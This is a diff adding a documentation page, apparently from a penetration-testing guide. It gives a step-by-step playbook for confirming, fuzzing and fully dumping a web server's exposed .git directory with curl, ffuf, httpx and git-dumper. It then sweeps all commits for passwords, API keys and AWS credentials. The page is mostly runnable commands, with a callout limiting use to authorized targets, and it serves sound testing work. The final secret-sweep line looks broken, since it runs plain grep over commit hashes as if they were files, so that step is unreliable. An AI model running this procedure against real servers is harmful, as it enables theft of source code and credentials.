@@ -1,0 +1,227 @@
+---
+title: Git Exposure Discovery & Extraction
+description: Confirm, fuzz, and fully extract a misconfigured .git directory exposed on a web server — including deleted files and secrets from old commits.
+---
+
+<Callout type="info" title="Playbook">
+  This recipe chains `curl`, [FFUF](/docs/web-fuzzing/ffuf), `git`,
+  [HTTPX](https://github.com/projectdiscovery/httpx), and
+  [git-dumper](https://github.com/arthaud/git-dumper) into one pipeline:
+  confirm exposure, fuzz for known internal `.git` paths, extract the index
+  locally, probe the tracked paths for live endpoints, then fully dump the
+  repo including history.
+</Callout>
+
+When a web server serves the `.git` directory of a deployed application
+(common misconfiguration: deploying with `git pull` directly to a webroot,
+or copying a repo folder without excluding `.git/`), the entire version
+history — including old commits, deleted files, and hardcoded secrets that
+were later "removed" — becomes retrievable.
+
+## Step 1 — Confirm .git is exposed
+
+Before fuzzing anything, check the two files that prove exposure on their
+own:
+
+<CommandInput
+  vars={{ target: "target.com" }}
+  command={`curl -s https://{{target}}/.git/HEAD`}
+  placeholderMode
+/>
+
+Expected if exposed: `ref: refs/heads/master`.
+
+<CommandInput
+  vars={{ target: "target.com" }}
+  command={`curl -s https://{{target}}/.git/config`}
+  placeholderMode
+/>
+
+Expected if exposed: a `[core]`/`[remote "origin"]` INI block.
+
+<Callout type="info">
+  A `200` with real git content confirms exposure. A `403`/`404` means
+  directory listing is blocked, but individual files might still be
+  readable — worth testing a couple of known filenames before giving up.
+</Callout>
+
+## Step 2 — Fuzz for known .git internal paths ([FFUF](/docs/web-fuzzing/ffuf))
+
+`.git/` has a predictable internal structure, so a purpose-built wordlist
+beats a generic content-discovery list. SecLists ships one:
+
+`/usr/share/wordlists/SecLists/Discovery/Web-Content/versioning_metafiles.txt`
+
+This list already includes the `.git/` prefix on each entry (`.git/HEAD`,
+`.git/config`, `.git/index`, `.git/logs/HEAD`, `.git/refs/heads/master`,
+`.git/packed-refs`, etc.), so fuzz at the domain root — see the
+[FFUF page](/docs/web-fuzzing/ffuf) for general flag reference.
+
+<CommandInput
+  vars={{ target: "target.com" }}
+  command={`ffuf -u https://{{target}}/FUZZ \\
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/versioning_metafiles.txt \\
+  -mc 200,301,403`}
+  placeholderMode
+/>
+
+<Callout type="warn">
+  Fuzz at the domain root, not `/.git/FUZZ` — appending prefixed entries
+  after an explicit `/.git/` in the URL produces broken duplicate paths like
+  `.git/.git/HEAD`.
+</Callout>
+
+`.git/objects/` subdirectories are 2-hex-char prefixes (`00`–`ff`) followed
+by 38-char SHA1 hash suffixes — not enumerable by wordlist. Once you've
+confirmed `HEAD`, `config`, and `index` are reachable, stop fuzzing and move
+to structured extraction (Steps 3–4) instead of trying to brute-force
+object hashes.
+
+## Step 3 — Pull and read .git/index locally
+
+Useful when you want a fast look, or when a target's rate limiting/WAF makes
+you want to size up the repo before running something as request-heavy as
+git-dumper (Step 4) — if that's not a concern, you can skip straight to Step
+4, which subsumes this file tree anyway.
+
+`.git/index` is git's binary staging-area manifest — it lists every tracked
+file's path, mode, size, and blob SHA1, without needing any of the actual
+file contents (objects). It's small and gives you the full file tree of the
+repo before committing to a full dump.
+
+<CommandInput
+  vars={{ target: "target.com" }}
+  derivedVars={{ output: { from: "target", template: "git-index_{value}" } }}
+  publishChannel="git-index"
+  command={`curl -s https://{{target}}/.git/index -o {{output}}`}
+  placeholderMode
+/>
+
+To read it, git needs it inside an actual `.git` directory — you can't
+parse it standalone.
+
+`input` tracks this step's own `output` field above live — edit it directly
+here to break the link.
+
+<CommandInput
+  vars={{ input: "git-index_target.com" }}
+  derivedVars={{ input: { channel: "git-index" } }}
+  command={`file {{input}}
+mkdir git-index-check && cd git-index-check
+git init -q
+cp ../{{input}} .git/index
+git ls-files -s | head -50
+git ls-files > tracked-files.txt
+wc -l tracked-files.txt`}
+  placeholderMode
+/>
+
+| Command | Meaning |
+| --- | --- |
+| `file {{input}}` | Confirms the downloaded file really is a git index — expect output like `Git index, version 2, 1927 entries`. |
+| `mkdir git-index-check && cd git-index-check` | Creates a scratch directory to reconstruct the index in. |
+| `git init -q` | Scaffolds an empty `.git/` structure to drop the stolen index into. |
+| `cp ../{{input}} .git/index` | Drops the stolen index into place. |
+| `git ls-files -s \| head -50` | Path + mode + blob hash + stage, first 50 entries. |
+| `git ls-files > tracked-files.txt` | Full flat list of every tracked path. |
+| `wc -l tracked-files.txt` | Sanity check against the entry count `file` reported. |
+
+`git ls-files -s` output format: `<mode> <blob-sha1> <stage>\t<path>` — the
+blob hash is what you'd need to pull that specific file's content via
+`git cat-file -p <hash>` once objects are available (Step 4 gets you those
+automatically).
+
+What to look for in the tracked file list:
+
+- App-level config files (`config.php`, `settings.py`, `.env`,
+  `database.yml`) — highest value, likely to contain credentials.
+- Deploy/infra config (`.ebextensions/*.config`, `appspec.yml`,
+  `Dockerfile`, CI configs) — can leak internal endpoints, IAM roles, deploy
+  secrets.
+- Ignore `vendor/`, `node_modules/`, or other dependency-manager
+  directories — that's third-party library source, not app secrets, and
+  will dominate the count (e.g. 1,821 of 1,927 files in one real case were
+  just Composer vendor code).
+
+Turn that tracked file list into live endpoint checks — build a full URL for
+each path and probe it with [HTTPX](https://github.com/projectdiscovery/httpx)
+(`httpx-toolkit` binary) to see what's actually reachable on the live
+server:
+
+<CommandInput
+  vars={{ target: "target.com" }}
+  command={`grep -v '^vendor/' tracked-files.txt | awk -v b="https://{{target}}" '{print b"/"$0}' | \\
+  httpx-toolkit -sc -cl -ct -fc 404 -t 10 -rl 10 -silent`}
+  placeholderMode
+/>
+
+| Flag | Meaning |
+| --- | --- |
+| `grep -v '^vendor/'` | Excludes vendor paths — third-party library code, not app-specific. |
+| `awk -v b="..." '{print b"/"$0}'` | Prepends the base URL to each tracked path to build a full request URL. |
+| `-sc` | Show HTTP status code. |
+| `-cl` | Show Content-Length. |
+| `-ct` | Show Content-Type. |
+| `-fc 404` | Filter out (hide) responses with status code 404. |
+| `-t <n>` | Number of concurrent threads. |
+| `-rl <n>` | Rate limit — max requests per second. |
+| `-silent` | Suppress banner/noise, print clean results only. |
+
+## Step 4 — Full recursive extraction with [git-dumper](https://github.com/arthaud/git-dumper)
+
+The index only gives you paths and hashes — to get actual file contents
+(including from old commits and deleted files that never appear in the
+current index), you need the object database. Manually walking `objects/`,
+`refs/`, and `packed-refs` is exactly what git-dumper automates:
+
+<Cards>
+  <Card title="git-dumper on GitHub" href="https://github.com/arthaud/git-dumper">
+    Source, full usage reference, and releases.
+  </Card>
+</Cards>
+
+What it does under the hood:
+
+1. Reads `.git/HEAD` to find the current branch ref.
+2. Reads `.git/packed-refs` and `.git/refs/heads/*` to enumerate all
+   branches/tags.
+3. Walks the commit → tree → blob object graph from those refs, fetching
+   each object by its hash path (`.git/objects/xx/yyyyyy...`).
+4. Reconstructs a full working checkout, git history included, in the
+   output directory.
+
+<CommandInput
+  vars={{ target: "target.com" }}
+  derivedVars={{ output: { from: "target", template: "git-dumper_{value}" } }}
+  publishChannel="git-dumper"
+  command={`git-dumper https://{{target}}/.git/ {{output}}`}
+  placeholderMode
+/>
+
+Once dumped, treat it like any local git repo. `input` tracks this step's
+own `output` field above live — edit it directly here to break the link.
+
+<CommandInput
+  vars={{ input: "git-dumper_target.com" }}
+  derivedVars={{ input: { channel: "git-dumper" } }}
+  command={`cd {{input}}
+git init
+git log --all --oneline
+git log --all --diff-filter=D --summary
+grep -riE "password|secret|api[_-]?key|aws_(access|secret)" -- $(git rev-list --all)`}
+  placeholderMode
+/>
+
+| Command | Meaning |
+| --- | --- |
+| `git init` | Re-initializes the git repo config in place — safe/no-op if git-dumper already left a fully-initialized `.git/` here. |
+| `git log --all --oneline` | Full commit history, including reverted/deleted-file commits. |
+| `git log --all --diff-filter=D --summary` | Commits that deleted files — check what was removed and why. |
+| `grep -riE "..." -- $(git rev-list --all)` | Sweep all commits, not just `HEAD`, for likely secret patterns (passwords, API keys, AWS credentials). |
+
+<Callout type="warn">
+  Secrets rotated out of the current codebase but still sitting in old
+  commits are one of the most common high-value findings from this class of
+  bug. Only dump and inspect `.git` exposures on targets you're authorized
+  to test.
+</Callout>
